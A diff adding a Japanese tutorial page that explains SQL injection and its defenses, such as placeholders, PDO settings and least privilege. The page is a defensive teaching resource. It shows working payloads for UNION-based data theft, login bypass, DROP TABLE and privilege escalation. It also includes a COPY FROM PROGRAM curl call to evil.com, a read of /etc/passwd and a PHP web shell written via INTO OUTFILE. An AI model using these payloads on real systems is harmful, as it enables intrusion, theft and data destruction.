@@ -1,0 +1,913 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SQLインジェクション｜Web脆弱性対策解説</title>
+<link rel="stylesheet" href="../../_解説HTML/style.css">
+</head>
+<body>
+<header class="topbar">
+  <div class="topbar-inner">
+    <a class="site" href="00-0_目次.html">Web脆弱性対策解説</a>
+    <span class="crumb"><a href="00-0_目次.html">目次</a> › 20 インジェクション › SQLインジェクション</span>
+    <button class="toc-btn" type="button">目次</button>
+  </div>
+</header>
+
+<div class="layout">
+  <nav class="toc" id="toc"><p class="toc-title">このページの目次</p><ol id="toc-list"></ol></nav>
+
+  <main>
+    <div class="hero">
+      <span class="eyebrow">20 インジェクション</span>
+      <h1>SQLインジェクション</h1>
+      <p class="lead">SQLインジェクションは、Webアプリが組み立てる SQL 文に悪意ある入力を混ぜ込み、データベースを不正に操作する攻撃です。情報の窃取・認証回避・データ改ざんから、OS コマンドの実行やファイルの読み書きまで、どんな被害が起きるのかを見たうえで、根本対策の「プレースホルダ」、PHP の PDO の安全な設定、LIKE 検索・動的な検索条件・ソートの注意点、被害を小さくする保険的対策までを順に解説します。最後に XSS と並べて「同じ形の穴」として整理し、AI にコードを書かせたときの確認ポイントも紹介します。</p>
+      <p class="meta">もとにしたノート：20_インジェクション/03_SQL呼び出しに伴う脆弱性（徳丸本7章）・04_SQLインジェクションとXSS（ねる前エンジニアリング）</p>
+    </div>
+
+    <div class="callout key">
+      <p class="callout-title">ひとことで言うと</p>
+      <p>SQLインジェクションは、<strong>データのつもりで入れた文字が、データベースに「命令」として読まれてしまう</strong> 穴です。対策の基本は、SQL の命令部分と値を <strong>そもそも混ぜない</strong> こと。値は <strong>プレースホルダ</strong> を使って命令とは「別の便」で渡します。「記号を消す」より「混ぜない」が基本です。</p>
+    </div>
+
+    <p>この章（徳丸本 第7章）の前に、第4章（00_全体像/02_Webアプリの機能と脆弱性）ではインジェクション系脆弱性の概要を、第5章・第6章では XSS を学びました（→ <a href="20-1_XSSの基本.html">XSSの基本</a>、<a href="20-2_XSS発展編.html">XSS発展編</a>）。このページでは <strong>SQL 呼び出しに伴う脆弱性</strong>、とくに <strong>SQLインジェクション</strong> の攻撃手法と対策を扱います。インジェクション全体の考え方（データとコードの混在）は <a href="../../71_セキュリティ基礎/00_全体像/40-3_インジェクションと暗号化の不備.html">インジェクションと暗号化の不備</a> にまとめてあるので、ここでは SQL に特有の話を中心に進めます。</p>
+
+    <h2 id="sec-1"><span class="num">1.</span>SQLインジェクションとは</h2>
+    <p><strong>SQLインジェクション（SQL Injection）</strong> は、Webアプリケーションが生成する SQL 文に <strong>悪意ある入力を混入</strong> させ、データベースを不正操作する攻撃です。<strong>SQL</strong> とは、データベースに「このデータを探せ」「この行を書き換えろ」と指示するための言語です。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>項目</th><th>内容</th></tr></thead>
+      <tbody>
+        <tr><td><strong>分類</strong></td><td>インジェクション系脆弱性</td></tr>
+        <tr><td><strong>インターフェース</strong></td><td>SQL</td></tr>
+        <tr><td><strong>悪用手口</strong></td><td>SQL 文・SQL コマンドの注入</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-1-1">1.1 実務でありそうな場面</h3>
+    <ul>
+      <li>管理画面の会員検索欄に記号を入れたら、名前と関係なく <strong>全員分のデータ</strong> が出てきた</li>
+      <li>口コミのコメント欄に書かれたコメントを別の人が開いたら、中身がプログラムとして動き出した（こちらは XSS です。<a href="20-1_XSSの基本.html">XSSの基本</a> で扱います）</li>
+      <li>AI に検索処理を書かせたら、入力をそのまま文字列につないで命令を作っていた</li>
+    </ul>
+    <p>1つ目と3つ目が SQLインジェクションです。3つとも根っこは同じで、「データのつもりの文字が命令として読まれる」ことが原因です（12章で並べて整理します）。</p>
+
+    <h3 id="sec-1-2">1.2 なぜ起きるか</h3>
+    <p class="code-label bad">✕ 脆弱：ユーザー入力を SQL 文字列に直接連結</p>
+<pre><code>// ❌ 脆弱：ユーザー入力を SQL 文字列に直接連結
+$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";</code></pre>
+    <p>PHP の <code>.</code> は文字列をつなぐ演算子、<code>$_POST['username']</code> はフォームから送られてきたユーザー名です。</p>
+<pre><code>ユーザー入力 → SQL 文字列に連結 → DB が入力を「命令」として解釈 → 不正操作</code></pre>
+    <div class="callout key">
+      <p class="callout-title">根本原因</p>
+      <p>SQL の <strong>命令部分</strong> と <strong>データ部分</strong> を分離せず、ユーザー入力をそのまま SQL に埋め込んでいることです。</p>
+    </div>
+
+    <h2 id="sec-2"><span class="num">2.</span>攻撃を読むための SQL の基本</h2>
+    <h3 id="sec-2-1">2.1 SQL の基本</h3>
+<pre><code>SELECT * FROM users
+WHERE username = 'alice'
+  AND password = 'password123'</code></pre>
+    <p>「<code>users</code> 表から、ユーザー名が alice で、かつパスワードが password123 の行をすべて（<code>*</code>）取り出せ」という意味です。攻撃でよく使われる記号・キーワードは次のとおりです。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>記号・キーワード</th><th>意味</th></tr></thead>
+      <tbody>
+        <tr><td><code>'...'</code></td><td>文字列リテラル（シングルクォートで囲む）</td></tr>
+        <tr><td><code>--</code></td><td>行コメント（以降を無視）</td></tr>
+        <tr><td><code>OR</code></td><td>「または」条件</td></tr>
+        <tr><td><code>1=1</code></td><td>常に真（TRUE）</td></tr>
+        <tr><td><code>;</code></td><td>SQL 文の区切り</td></tr>
+        <tr><td><code>UNION</code></td><td>2つの SELECT 結果を結合</td></tr>
+      </tbody>
+    </table></div>
+    <p><strong>リテラル</strong> とは、プログラムや SQL の中に直接書いた値のことです。</p>
+
+    <h3 id="sec-2-2">2.2 入力が「囲い」を内側から越える</h3>
+    <p>プログラムは「名前がこれの人を探せ」という <strong>ひな型</strong> の空いた部分に入力をはめ込みます。名前は引用符で囲まれ、<strong>囲いの中がデータ</strong> です。</p>
+    <ul>
+      <li>入力に <code>' OR 1=1</code> のような記号を入れると、先頭の引用符で囲いが閉じ、<code>OR 1=1</code> が囲いの外に出て <strong>命令として読まれます</strong></li>
+      <li><code>1=1</code> は常に正しいので、全員分のデータが返ります。ひな型は何も壊れていないのに、入力が境界を内側から越えてしまうのです</li>
+      <li>入れた側の気持ちでは全体が「名前」のつもりでも、データベースにはどこまでが入力だったかという区別は届きません。届くのはただの1本の文字列です</li>
+    </ul>
+
+    <h2 id="sec-3"><span class="num">3.</span>情報を盗む攻撃：エラーメッセージと UNION SELECT</h2>
+    <h3 id="sec-3-1">3.1 エラーメッセージ経由の情報漏洩</h3>
+    <p>SQL 実行時の <strong>詳細なエラーメッセージ</strong> を画面に表示すると、攻撃者に <strong>SQLインジェクションの手がかり</strong> を与えます。</p>
+    <h4>漏洩する情報</h4>
+    <div class="table-wrap"><table>
+      <thead><tr><th>エラー内容</th><th>攻撃者へのメリット</th></tr></thead>
+      <tbody>
+        <tr><td>テーブル名</td><td><code>users</code> 等の存在を確認</td></tr>
+        <tr><td>カラム名</td><td><code>password</code>, <code>email</code> 等の構造を推測</td></tr>
+        <tr><td>SQL 文の断片</td><td>注入ポイントの特定</td></tr>
+        <tr><td>DB の種類</td><td>MySQL / PostgreSQL 向け攻撃の選択</td></tr>
+      </tbody>
+    </table></div>
+    <p><strong>テーブル</strong> はデータベースの表、<strong>カラム</strong> は表の列（項目）のことです。</p>
+    <h4>攻撃の流れ</h4>
+<pre><code>1. 攻撃者が意図的に不正入力を送る
+   入力: '
+
+2. DB がエラーを返す
+   エラー: You have an error in your SQL syntax near ''' at line 1
+
+3. 攻撃者が SQL 構造を推測
+   → username = '...' 形式だと分かる
+
+4. 段階的に攻撃を洗練
+   ' OR '1'='1' --
+   ' UNION SELECT ...</code></pre>
+    <h4>対策</h4>
+    <ul>
+      <li>本番環境では <strong>詳細エラーを画面に表示しない</strong></li>
+      <li>エラー詳細は <strong>サーバーログ</strong> に記録</li>
+      <li>ユーザーには汎用メッセージのみ表示</li>
+    </ul>
+    <p>具体的なコードは 8.2 と 11.2 で扱います。エラー処理全般の考え方は <a href="../../71_セキュリティ基礎/00_全体像/40-6_ログ不足・SSRF・例外処理.html">ログ不足・SSRF・例外処理</a> を参照してください。</p>
+
+    <h3 id="sec-3-2">3.2 UNION SELECT を用いた情報漏洩</h3>
+    <p><strong>UNION SELECT</strong> を悪用すると、本来アクセスできない <strong>他テーブルのデータ</strong> を取得できます。</p>
+    <h4>UNION とは</h4>
+<pre><code>-- 2つの SELECT 結果を縦に結合
+SELECT name, email FROM users WHERE id = 1
+UNION
+SELECT username, password FROM admin_users;</code></pre>
+    <p><strong>条件：</strong> 両方の SELECT の <strong>列数と型</strong> が一致している必要があります。</p>
+    <h4>攻撃例</h4>
+<pre><code>-- 脆弱な SQL
+SELECT * FROM products WHERE name = '$input'
+
+-- 攻撃入力
+' UNION SELECT username, password, email, null FROM users --
+
+-- 生成される SQL
+SELECT * FROM products WHERE name = ''
+UNION SELECT username, password, email, null FROM users --'</code></pre>
+    <p>商品検索のつもりの画面に、<code>users</code> 表のユーザー名・パスワード・メールアドレスが「商品」として並んでしまいます。<code>null</code> は列数を合わせるための埋め草です。</p>
+    <h4>攻撃の手順</h4>
+<pre><code>1. 列数を特定（ORDER BY 1, ORDER BY 2, ... でエラーが出るまで試行）
+2. 表示可能な列を特定
+3. UNION SELECT で機密データを取得</code></pre>
+    <h4>被害</h4>
+    <ul>
+      <li>ユーザーテーブル全件の漏洩</li>
+      <li>パスワードハッシュの取得</li>
+      <li>管理者アカウント情報の窃取</li>
+    </ul>
+
+    <h2 id="sec-4"><span class="num">4.</span>認証回避とデータ改ざん</h2>
+    <h3 id="sec-4-1">4.1 SQLインジェクションによる認証回避</h3>
+    <p>ログイン処理は SQLインジェクションの <strong>最も典型的な標的</strong> です。</p>
+    <p class="code-label bad">✕ 脆弱なログイン処理</p>
+<pre><code>$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'
+        AND password = '" . $_POST['password'] . "'";</code></pre>
+    <h4>攻撃入力</h4>
+<pre><code>ユーザー名: admin' --
+パスワード: （任意・空でも可）</code></pre>
+    <h4>生成される SQL</h4>
+<pre><code>SELECT * FROM users WHERE username = 'admin' --'
+AND password = '...'
+--            ↑ ここ以降はコメントアウト（パスワード条件が無効）</code></pre>
+    <p><strong>コメントアウト</strong> とは、<code>--</code> 以降をコメント扱いにして無視させることです。パスワードの条件が消え、admin としてログインできてしまいます。</p>
+    <h4>別パターン</h4>
+<pre><code>ユーザー名: ' OR '1'='1' --
+→ WHERE 条件が常に TRUE になり、最初のユーザーでログイン成功</code></pre>
+    <h4>対策</h4>
+    <ul>
+      <li><strong>プレースホルダ</strong> で SQL とデータを分離（7章）</li>
+      <li>パスワードは <strong>ハッシュ比較</strong>（平文保存は別問題として避ける。→ <a href="../../71_セキュリティ基礎/00_全体像/40-3_インジェクションと暗号化の不備.html">インジェクションと暗号化の不備</a> の「パスワードを平文で保存しない」）</li>
+    </ul>
+
+    <h3 id="sec-4-2">4.2 SQLインジェクション攻撃によるデータ改ざん</h3>
+    <p>SQLインジェクションは <strong>データの読み取り（SELECT）</strong> だけでなく、<strong>改ざん・削除</strong> も可能です。</p>
+    <h4>UPDATE / DELETE の注入</h4>
+<pre><code>-- プロフィール更新（脆弱）
+UPDATE users SET email = '$input' WHERE id = $userId
+
+-- 攻撃入力
+', is_admin = 1 WHERE id = 1 --
+
+-- 結果：管理者権限が付与される</code></pre>
+    <p>生成される SQL は <code>UPDATE users SET email = '', is_admin = 1 WHERE id = 1 --' WHERE id = …</code> となり、本来の <code>WHERE</code> 条件はコメントで無効になります。</p>
+    <h4>DROP TABLE</h4>
+<pre><code>-- 攻撃入力
+'; DROP TABLE users; --
+
+-- 複文が実行可能な環境ではテーブルごと削除</code></pre>
+    <p><strong>複文</strong> とは、<code>;</code> で区切った複数の SQL 文を一度に実行することです（8.3 で禁止方法を扱います）。</p>
+    <h4>INSERT の注入</h4>
+<pre><code>-- 攻撃者が管理者アカウントを直接 INSERT
+'; INSERT INTO users (username, is_admin) VALUES ('hacker', 1); --</code></pre>
+    <h4>被害</h4>
+    <div class="table-wrap"><table>
+      <thead><tr><th>操作</th><th>被害</th></tr></thead>
+      <tbody>
+        <tr><td>UPDATE</td><td>権限昇格、データ書き換え</td></tr>
+        <tr><td>DELETE</td><td>データの大量削除</td></tr>
+        <tr><td>INSERT</td><td>不正アカウントの作成</td></tr>
+        <tr><td>DROP</td><td>テーブル・DB の破壊</td></tr>
+      </tbody>
+    </table></div>
+
+    <h2 id="sec-5"><span class="num">5.</span>データベースの外まで広がる被害</h2>
+    <p>DBMS（データベース管理システム。MySQL・PostgreSQL・SQL Server など）の機能や設定によっては、被害はデータベースの中だけにとどまりません。</p>
+
+    <h3 id="sec-5-1">5.1 SQL コマンドの実行（OS コマンド）</h3>
+    <p>DBMS によっては、SQLインジェクション経由で <strong>OS コマンド</strong>（サーバーの OS に直接出す命令）を実行できる場合があります。</p>
+    <p class="code-label">MySQL の例</p>
+<pre><code>-- UDF（User Defined Function）や特定設定が有効な場合
+SELECT sys_exec('id');</code></pre>
+    <p class="code-label">SQL Server の例</p>
+<pre><code>-- xp_cmdshell（有効な場合）
+EXEC xp_cmdshell 'whoami';</code></pre>
+    <p class="code-label">PostgreSQL の例</p>
+<pre><code>COPY ... FROM PROGRAM 'curl http://evil.com'</code></pre>
+    <p><strong>UDF</strong> は利用者が追加できる独自関数、<code>id</code>・<code>whoami</code> は「今どのユーザーで動いているか」を表示する OS コマンドです。</p>
+    <h4>条件</h4>
+    <div class="table-wrap"><table>
+      <thead><tr><th>条件</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>DB ユーザーの権限</strong></td><td>SUPER 権限等が必要なことが多い</td></tr>
+        <tr><td><strong>DBMS の設定</strong></td><td>危険な機能が有効化されている</td></tr>
+        <tr><td><strong>複文実行</strong></td><td><code>;</code> で複数 SQL を実行できる</td></tr>
+      </tbody>
+    </table></div>
+    <p><strong>対策：</strong> 最小権限の DB ユーザー ＋ 複文実行の禁止 ＋ プレースホルダ。OS コマンドを直接呼び出す処理の脆弱性は <a href="20-4_OSコマンドインジェクション.html">OSコマンドインジェクション</a> で扱います。</p>
+
+    <h3 id="sec-5-2">5.2 ファイルの読み出し、書き出し</h3>
+    <p>MySQL 等では、SQLインジェクション経由で <strong>サーバー上のファイル</strong> にアクセスされる恐れがあります。</p>
+    <p class="code-label">ファイル読み出し（MySQL）</p>
+<pre><code>-- LOAD_FILE 関数
+' UNION SELECT LOAD_FILE('/etc/passwd'), null, null --</code></pre>
+    <p class="code-label">ファイル書き出し（MySQL）</p>
+<pre><code>-- INTO OUTFILE
+' UNION SELECT '&lt;?php system($_GET["c"]); ?&gt;', null
+INTO OUTFILE '/var/www/html/shell.php' --</code></pre>
+    <p>書き出しの例は、URL で渡したコマンドを実行する PHP ファイル（<strong>Web シェル</strong>）を公開フォルダに置く攻撃です。置かれてしまうと、サーバーを外から自由に操作されます。</p>
+    <h4>条件</h4>
+    <div class="table-wrap"><table>
+      <thead><tr><th>操作</th><th>必要な条件</th></tr></thead>
+      <tbody>
+        <tr><td>LOAD_FILE</td><td>FILE 権限、secure_file_priv の設定</td></tr>
+        <tr><td>INTO OUTFILE</td><td>FILE 権限、書き込み可能なディレクトリ</td></tr>
+      </tbody>
+    </table></div>
+    <h4>対策</h4>
+    <ul>
+      <li>DB ユーザーに <strong>FILE 権限を与えない</strong></li>
+      <li><code>secure_file_priv</code>（MySQL がファイルを読み書きできる場所を制限する設定）を適切に設定</li>
+      <li>Web ルート（公開フォルダ）への書き込み権限を DB ユーザーに与えない</li>
+    </ul>
+    <p>アプリ自身のファイル読み書きにまつわる脆弱性は、<a href="40-1_ファイルアクセスとディレクトリトラバーサル.html">ファイルアクセスとディレクトリトラバーサル</a> で扱います。</p>
+
+    <h3 id="sec-5-3">5.3 HTTP リクエストにより他のサーバーを攻撃</h3>
+    <p>SQLインジェクションを踏み台に、<strong>他のサーバーへ HTTP リクエスト</strong> を送る攻撃（SSRF に近い）もあります。<strong>SSRF</strong>（サーバーサイドリクエストフォージェリ）は、サーバーに攻撃者の望む宛先へ通信させる攻撃で、<a href="30-3_SSRF.html">SSRF</a> のページで扱います（概要は <a href="../../71_セキュリティ基礎/00_全体像/40-6_ログ不足・SSRF・例外処理.html">ログ不足・SSRF・例外処理</a>）。</p>
+<pre><code>-- MySQL の LOAD DATA INFILE や UDF 経由
+-- SQL Server の OLE Automation 等
+
+-- 概念例：DB 機能を使った外部通信
+SELECT http_get('http://internal-server/admin/delete?id=1');</code></pre>
+    <div class="callout warn">
+      <p class="callout-title">補足：LOAD DATA INFILE は通信の機能ではありません</p>
+      <p>ノートの例に挙がっている MySQL の <code>LOAD DATA INFILE</code> は、ファイルを表に取り込む機能で、それ自体は HTTP 通信をしません。外部通信に使われるのは、UDF（独自関数）や SQL Server の OLE Automation、Oracle の <code>UTL_HTTP</code> のような通信用の機能です。<code>http_get</code> も、こうした拡張で追加される関数をイメージした <strong>概念例</strong> です。</p>
+    </div>
+    <h4>被害</h4>
+    <div class="table-wrap"><table>
+      <thead><tr><th>被害</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>内部ネットワークのスキャン</strong></td><td>ファイアウォール内のサーバーへアクセス</td></tr>
+        <tr><td><strong>内部 API の不正呼び出し</strong></td><td>認証なしの内部サービスを攻撃</td></tr>
+        <tr><td><strong>ポートスキャン</strong></td><td>ネットワーク構成の把握</td></tr>
+      </tbody>
+    </table></div>
+    <h4>対策</h4>
+    <ul>
+      <li>DB から外部ネットワークへの通信を <strong>制限</strong></li>
+      <li>最小権限 ＋ 危険な拡張機能の無効化</li>
+    </ul>
+
+    <h2 id="sec-6"><span class="num">6.</span>注入ポイント：文字リテラルと数値項目</h2>
+    <h3 id="sec-6-1">6.1 文字リテラルの問題</h3>
+    <p>SQLインジェクションが最も起きやすいのは、<strong>文字列リテラル（<code>'...'</code>）</strong> にユーザー入力を埋め込む場合です。</p>
+    <p class="code-label bad">✕ 脆弱なパターン</p>
+<pre><code>$name = $_GET['name'];
+$sql = "SELECT * FROM users WHERE name = '$name'";</code></pre>
+    <h4>攻撃の仕組み</h4>
+<pre><code>正常:  WHERE name = 'alice'
+攻撃:  WHERE name = 'alice' OR '1'='1' --'
+              ↑ シングルクォートで文字列を閉じ、SQL を注入</code></pre>
+    <h4>対策</h4>
+    <div class="table-wrap"><table>
+      <thead><tr><th>対策</th><th>説明</th></tr></thead>
+      <tbody>
+        <tr><td><strong>プレースホルダ</strong></td><td>データを SQL 命令と分離（根本対策）</td></tr>
+        <tr><td><strong>エスケープ</strong></td><td><code>'</code> を <code>''</code> に変換（プレースホルダの補助、単独では非推奨）</td></tr>
+      </tbody>
+    </table></div>
+    <p><strong>エスケープ</strong> とは、特別な意味を持つ記号を「ただの文字」として扱われる形に書き換えることです。SQL では <code>'</code> を2つ重ねると、文字としての <code>'</code> になります。</p>
+    <p class="code-label bad">✕ エスケープのみに頼る（非推奨）</p>
+<pre><code>// ❌ エスケープのみに頼る（非推奨）
+$name = str_replace("'", "''", $_GET['name']);</code></pre>
+    <p class="code-label good">○ プレースホルダを使う</p>
+<pre><code>// ✅ プレースホルダを使う
+$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE name = ?');
+$stmt-&gt;execute([$_GET['name']]);</code></pre>
+    <div class="callout tip">
+      <p class="callout-title">「引用符を消せばよいのでは？」</p>
+      <p>昔は、危険な記号を無害な形に書き換える対策も使われていました。しかしこれは、<strong>危ない記号をすべて自分で見つける</strong> ことが前提で、1か所でも忘れたらそこから入られます。記号の書き方には思わぬ抜け道もあります。一方、命令と値を分ける方法は <strong>仕組みで区別</strong> するので、コードを見て「つないでいるか」だけ確かめればよく、問題も見つけやすいのです。</p>
+    </div>
+
+    <h3 id="sec-6-2">6.2 数値項目に対する SQLインジェクション</h3>
+    <p>数値項目は引用符で囲まないため <strong>文字列リテラルより安全に見えますが</strong>、検証を怠ると SQLインジェクションが成立します。囲いがない分、閉じる必要すらありません。</p>
+    <p class="code-label bad">✕ 脆弱なパターン</p>
+<pre><code>$id = $_GET['id'];
+$sql = "SELECT * FROM products WHERE id = $id";  // 引用符なし</code></pre>
+    <h4>攻撃入力</h4>
+<pre><code>?id=1 OR 1=1
+?id=1; DROP TABLE products; --
+?id=1 UNION SELECT username, password FROM users</code></pre>
+    <h4>生成される SQL</h4>
+<pre><code>SELECT * FROM products WHERE id = 1 OR 1=1
+-- 全商品が返る
+
+SELECT * FROM products WHERE id = 1; DROP TABLE products; --
+-- テーブル削除（複文実行が可能な場合）</code></pre>
+    <h4>対策</h4>
+    <p class="code-label good">○ 型検証 ＋ プレースホルダ</p>
+<pre><code>// ✅ 数値として検証してから使用
+$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
+if ($id === false) {
+    die('不正な ID です');
+}
+
+// ✅ さらにプレースホルダを使う（推奨）
+$stmt = $pdo-&gt;prepare('SELECT * FROM products WHERE id = ?');
+$stmt-&gt;execute([$id]);</code></pre>
+    <p><code>filter_var(…, FILTER_VALIDATE_INT)</code> は、値が整数として正しければその整数を、そうでなければ <code>false</code> を返す PHP の関数です。</p>
+    <div class="callout key">
+      <p class="callout-title">原則</p>
+      <p>数値項目でも <strong>型検証 ＋ プレースホルダ</strong> を使います。</p>
+    </div>
+
+    <h2 id="sec-7"><span class="num">7.</span>根本対策：プレースホルダによる SQL 文の組み立て</h2>
+    <p><strong>プレースホルダ</strong>（値の置き場所を示す印。<code>?</code> などで書く）を使って SQL を組み立てる方式は <strong>プリペアドステートメント（Prepared Statement）</strong> とも呼ばれ、SQLインジェクション対策の <strong>最も重要な手法</strong> です。</p>
+
+    <h3 id="sec-7-1">7.1 仕組み</h3>
+<pre><code>① SQL の「骨格」を先に DB に送る
+   SELECT * FROM users WHERE username = ? AND password = ?
+
+② プレースホルダ（?）の位置が確定 → SQL の意味が固定
+
+③ データを後からバインド
+   'alice', 'password123'
+
+④ データは「値」としてのみ扱われ、SQL 命令として解釈されない</code></pre>
+    <p><strong>バインド</strong> とは、プレースホルダに実際の値を結びつけることです。</p>
+    <ul>
+      <li><strong>危ない書き方：</strong> ひな型の文字列と入力を <strong>足し算でつなぐ</strong>。つないだ瞬間にデータと命令の区別が消え、混ざった1本の文字列が DB に届きます</li>
+      <li><strong>安全な書き方：</strong> 名前の場所にプレースホルダを置き、値は命令とは <strong>別の便</strong> で渡します。先に命令だけが DB に渡って形が確定し、後から届いた値はどんな記号でもただの文字として扱われ、「該当なし」になります。<strong>入力は命令の形を変えられません</strong></li>
+    </ul>
+
+    <figure>
+    <svg viewBox="0 0 720 340" role="img" aria-label="文字列連結では命令と入力が1本の文字列になってDBに届き、OR 1=1 が命令として読まれる。プレースホルダでは命令が先に送られて形が確定し、値は別の便で届くのでただの文字として扱われる">
+      <defs>
+        <marker id="arw203a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="d-arrowhead"/></marker>
+        <marker id="arw203b" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" class="d-arrowhead-bad"/></marker>
+      </defs>
+      <text x="20" y="26" class="d-text-bold">✕ 文字列を連結する</text>
+      <rect x="20" y="42" width="190" height="56" rx="8" class="d-box-accent"/>
+      <text x="115" y="66" text-anchor="middle" class="d-text-bold">ひな型（命令）</text>
+      <text x="115" y="86" text-anchor="middle" class="d-text-sub">WHERE name = '　'</text>
+      <text x="228" y="76" text-anchor="middle" class="d-text-bold">＋</text>
+      <rect x="246" y="42" width="160" height="56" rx="8" class="d-box-warn"/>
+      <text x="326" y="66" text-anchor="middle" class="d-text-bold">入力（データ）</text>
+      <text x="326" y="86" text-anchor="middle" class="d-text-sub">' OR 1=1 --</text>
+      <line x1="406" y1="70" x2="448" y2="70" class="d-line-bad" marker-end="url(#arw203b)"/>
+      <rect x="450" y="30" width="250" height="84" rx="8" class="d-box-bad"/>
+      <text x="575" y="54" text-anchor="middle" class="d-text-bold">DB に届くのは1本の文字列</text>
+      <text x="575" y="76" text-anchor="middle" class="d-text-sub">WHERE name = '' OR 1=1 --'</text>
+      <text x="575" y="98" text-anchor="middle" class="d-text-sub">OR 1=1 が命令に → 全件返る</text>
+
+      <line x1="20" y1="146" x2="700" y2="146" class="d-line-dash"/>
+
+      <text x="20" y="180" class="d-text-bold">○ プレースホルダで分ける</text>
+      <rect x="20" y="196" width="250" height="56" rx="8" class="d-box-accent"/>
+      <text x="145" y="220" text-anchor="middle" class="d-text-bold">① 命令だけ先に送る</text>
+      <text x="145" y="240" text-anchor="middle" class="d-text-sub">WHERE name = ?</text>
+      <rect x="20" y="270" width="250" height="56" rx="8" class="d-box-warn"/>
+      <text x="145" y="294" text-anchor="middle" class="d-text-bold">② 値を別の便で送る</text>
+      <text x="145" y="314" text-anchor="middle" class="d-text-sub">' OR 1=1 --</text>
+      <line x1="270" y1="224" x2="448" y2="224" class="d-line" marker-end="url(#arw203a)"/>
+      <line x1="270" y1="298" x2="448" y2="298" class="d-line" marker-end="url(#arw203a)"/>
+      <rect x="450" y="196" width="250" height="130" rx="8" class="d-box-good"/>
+      <text x="575" y="222" text-anchor="middle" class="d-text-bold">DB</text>
+      <text x="575" y="248" text-anchor="middle" class="d-text-sub">①で SQL の形が確定する</text>
+      <text x="575" y="272" text-anchor="middle" class="d-text-sub">②は ? に入るただの文字</text>
+      <text x="575" y="296" text-anchor="middle" class="d-text-sub">→ 名前が「' OR 1=1 --」の人を探す</text>
+      <text x="575" y="316" text-anchor="middle" class="d-text-sub">→ 該当なし（命令にならない）</text>
+    </svg>
+    <figcaption>図：つなぐと境界が消えて1本の文字列になる。分けて送れば、入力は SQL の形を変えられない</figcaption>
+    </figure>
+
+    <h3 id="sec-7-2">7.2 PHP（PDO）の例</h3>
+    <p><strong>PDO（PHP Data Objects）</strong> は、PHP からいろいろなデータベースを同じ書き方で扱うための標準機能です。<code>prepare</code> で骨格を渡し、<code>execute</code> で値を渡します。</p>
+    <p class="code-label good">○ 安全</p>
+<pre><code>// ✅ 安全
+$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE username = ? AND password = ?');
+$stmt-&gt;execute([$username, $password]);</code></pre>
+    <p class="code-label good">○ 名前付きプレースホルダ</p>
+<pre><code>// 名前付きプレースホルダ
+$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE username = :name');
+$stmt-&gt;execute(['name' =&gt; $username]);</code></pre>
+    <p>名前付きプレースホルダは <code>?</code> の代わりに <code>:name</code> のような名前で場所を示す書き方で、値が多いときに取り違えにくくなります。</p>
+
+    <h3 id="sec-7-3">7.3 攻撃入力が無害化される例</h3>
+<pre><code>入力: admin' OR '1'='1' --
+
+プレースホルダ使用時:
+  → 文字列「admin' OR '1'='1' --」というユーザー名を検索するだけ
+  → SQL 命令として解釈されない ✅</code></pre>
+    <p>ほかの言語（Node.js など）での書き方や、ORM（データベース操作をオブジェクトとして書ける仕組み）の注意点は <a href="../../71_セキュリティ基礎/00_全体像/40-3_インジェクションと暗号化の不備.html">インジェクションと暗号化の不備</a> の「SQL インジェクション：脆弱なコードと安全なコード」を参照してください。</p>
+
+    <h2 id="sec-8"><span class="num">8.</span>PDO の安全な使い方</h2>
+    <h3 id="sec-8-1">8.1 PDO のオプション</h3>
+    <p>PHP の PDO を使う場合、<strong>オプション設定</strong> によって安全性が大きく変わります。</p>
+    <p class="code-label good">○ 推奨設定</p>
+<pre><code>$pdo = new PDO($dsn, $user, $pass, [
+    // ① ネイティブプリペアドステートメント（静的プレースホルダ）
+    PDO::ATTR_EMULATE_PREPARES =&gt; false,
+
+    // ② 例外モード
+    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
+
+    // ③ デフォルトフェッチモード（任意）
+    PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
+]);</code></pre>
+    <p><code>$dsn</code> は接続先（DB の種類・ホスト・DB 名）を表す文字列、<strong>フェッチ</strong> は検索結果を1行ずつ取り出すことです。</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>オプション</th><th>推奨値</th><th>効果</th></tr></thead>
+      <tbody>
+        <tr><td><code>ATTR_EMULATE_PREPARES</code></td><td><code>false</code></td><td>DB 側でプリペア（静的プレースホルダ）</td></tr>
+        <tr><td><code>ATTR_ERRMODE</code></td><td><code>ERRMODE_EXCEPTION</code></td><td>エラーを例外として扱う</td></tr>
+        <tr><td><code>ATTR_DEFAULT_FETCH_MODE</code></td><td><code>FETCH_ASSOC</code></td><td>連想配列で取得</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3 id="sec-8-2">8.2 PDO で例外処理を使用する</h3>
+    <p><code>PDO::ATTR_ERRMODE</code> を <strong>例外モード</strong> に設定すると、エラーを適切に処理できます。<strong>例外</strong> とは、処理の失敗をプログラムに知らせる仕組みで、<code>try</code> の中で起きた失敗を <code>catch</code> で受け止めます。</p>
+<pre><code>$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</code></pre>
+    <p class="code-label good">○ 安全な例外処理</p>
+<pre><code>try {
+    $stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE id = ?');
+    $stmt-&gt;execute([$id]);
+    $user = $stmt-&gt;fetch();
+} catch (PDOException $e) {
+    // ❌ 詳細をユーザーに表示しない
+    // echo $e-&gt;getMessage();
+
+    // ✅ ログに記録し、汎用メッセージを表示
